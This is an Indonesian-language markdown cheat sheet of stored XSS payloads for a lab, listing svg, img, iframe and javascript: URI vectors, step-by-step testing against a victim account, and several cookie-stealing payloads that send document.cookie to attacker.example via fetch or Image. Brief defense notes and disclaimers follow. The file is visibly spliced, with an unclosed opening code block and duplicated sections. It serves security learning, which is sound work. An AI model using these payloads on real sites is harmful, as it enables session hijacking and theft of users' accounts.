# 🎯 XSS Payload Examples

File ini berisi contoh-contoh payload untuk testing Stored XSS vulnerability.

## Basic XSS Payloads

### 1. Simple Alert
```html
# 🎯 XSS Payload Examples (Non-<script> Variants)

File ini berisi contoh-contoh payload untuk testing Stored XSS (fokus pada payload yang tidak menggunakan tag `<script>` karena tag `<script>` sering tidak dieksekusi ketika dimasukkan via innerHTML pada browser modern).

## Mengapa hindari `<script>` saat testing?

Browser modern tidak mengeksekusi tag `<script>` yang dimasukkan ke DOM lewat `innerHTML` atau mekanisme yang setara. Jika aplikasi Anda menyuntikkan HTML mentah menggunakan `innerHTML` (atau React `dangerouslySetInnerHTML`), tag `<script>` mungkin ada di DOM tetapi tidak akan dijalankan. Sebagai gantinya, gunakan payload berbasis atribut/event (mis. `onerror`, `onload`) atau tag yang mengeksekusi event handler seperti `svg`, `img`, `iframe`, dll.

## SVG-based Payloads

```html
<svg onload=alert('XSS')></svg>
```

```html
<svg><animate onbegin="alert('XSS')" attributeName="x" /></svg>
```

```html
<svg><desc><![CDATA[</desc><script>alert('XSS')</script>]]></svg>
```

## IMG/Event-handler Payloads

```html
<img src=x onerror="alert('XSS')">
```

```html
<img src=1 onerror=confirm('XSS')>
```

```html
<img src=x onerror="fetch('http://attacker.example/steal?cookie='+document.cookie)">
```

## Event Attributes on Common Elements

```html
<div onclick="alert('XSS')">Click me</div>
```

```html
<input autofocus onfocus="alert('XSS')">
```

```html
<body onload="alert('XSS')">
```

## Data / URI and iframe-based Payloads

```html
<iframe src="data:text/html,<svg onload=alert('XSS')>"></iframe>
```

```html
<iframe src="data:text/html,<img src=x onerror=alert(document.domain)>"></iframe>
```

## JavaScript URI (Click Required)

```html
<a href="javascript:alert('XSS')">Click me</a>
```

## Style / CSS-based Vectors (Edge cases)

```html
<div style="background-image: url(javascript:alert('XSS'))">XSS</div>
```

## Media and Other Tags

```html
<audio src onerror="alert('XSS')"></audio>
<video><source onerror="alert('XSS')"></video>
```

## Advanced: DOM APIs via Event Handlers

Kadang penyerang memanggil `fetch()` atau `Image()` untuk mengirim data ke server penyerang:

```html
<img src=x onerror="new Image().src='http://attacker.example/collect?c='+document.cookie">
```

atau

```html
<svg onload="fetch('http://attacker.example/collect?c='+document.cookie)"></svg>
```

## Testing Steps (praktis)

1. Login ke aplikasi sebagai user target (mis. `korban`).
2. Buat post baru berisi salah satu payload di atas (mulai dari `img`/`svg` yang paling sederhana).
3. Buka halaman posts di browser lain atau akun lain, refresh dan perhatikan apakah alert/fetch/event terjadi.
4. Jika tidak terjadi, cek DevTools → Console/Network dan cek:
   - Apakah konten payload dikirim mentah oleh backend? (Network → response JSON)
   - Apakah payload muncul di DOM? (Elements tab)
   - Apakah ada header CSP yang memblokir execution? (Console)

## Contoh Cookie-stealing (untuk lab testing saja)

Gunakan server sederhana untuk menerima GET request (Python `python -m http.server 8000` tidak menerima GET query logging by default — gunakan server custom atau intercept dengan Burp/Netcat). Payload contoh:

```html
<img src=x onerror="new Image().src='http://attacker.example/steal?cookie='+encodeURIComponent(document.cookie)">
```

Atau dengan `fetch` (lebih modern):

```html
<svg onload="fetch('http://attacker.example/steal', {method:'POST', body:document.cookie})"></svg>
```

## Defense Notes

- Gunakan sanitasi input (mis. DOMPurify / sanitize-html) di server/klien.
- Gunakan output encoding: render sebagai text (`textContent`) bukan HTML.
- Siapkan CSP yang tepat dan cookie flags (`HttpOnly`, `SameSite`, `Secure`).
- Hindari menyimpan sensitive token di place yang dapat diakses JS (gunakan `HttpOnly` cookie).

## Disclaimer

Contoh payload di atas hanya untuk tujuan pembelajaran dan pengujian pada environment yang Anda miliki atau yang Anda diberi izin untuk diuji. Penggunaan payload ini pada sistem tanpa izin adalah ilegal.

Cek terminal Python untuk melihat cookie yang dicuri.

## Defense Mechanisms

Untuk mencegah XSS:

1. **Input Sanitization**
   - Strip semua HTML tags
   - Whitelist karakter yang diizinkan
   - Gunakan library seperti DOMPurify atau sanitize-html

2. **Output Encoding**
   - Encode HTML entities sebelum render
   - Gunakan textContent bukan innerHTML
   - Template engine dengan auto-escaping

3. **Content Security Policy (CSP)**
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'
   ```

4. **HttpOnly Cookies**
   ```javascript
   res.cookie('session', token, { httpOnly: true });
   ```

## ⚠️ Disclaimer

Payload ini hanya untuk tujuan pembelajaran dan ethical hacking pada sistem yang Anda miliki atau memiliki izin untuk test. Penggunaan tanpa izin adalah ILEGAL.
